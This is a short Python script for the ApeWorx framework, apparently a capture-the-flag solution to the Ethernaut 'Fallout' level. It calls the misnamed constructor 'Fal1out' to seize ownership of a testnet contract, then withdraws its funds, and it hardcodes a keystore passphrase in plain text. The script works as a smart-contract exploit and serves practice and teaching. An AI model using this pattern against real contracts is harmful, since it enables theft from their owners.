#!/usr/bin/python3
from ape import project, networks, accounts
from scripts.deploy import deploy_Fallout
from scripts.helper_functions import get_account

# sepolia: 0xb576c3DE4F9f8378925f48b86c9E20f728F3b958


def attack():
    if networks.active_provider.network.name == "local":
        fallout_contract = deploy_Fallout()
        _, attacker = get_account()
    else:
        fallout_contract = project.Fallout.at(
            "0xb576c3DE4F9f8378925f48b86c9E20f728F3b958"
        )
        attacker = accounts.load("ctf")
        attacker.set_autosign(True, passphrase="chaplesslife")

    fallout_contract.Fal1out(sender=attacker, value="1 wei")
    # * get the 1 wei back hahah
    fallout_contract.collectAllocations(sender=attacker)

    assert fallout_contract.owner() == attacker.address, "Not Owner yet"


def main():
    attack()


if __name__ == "__main__":
    main()
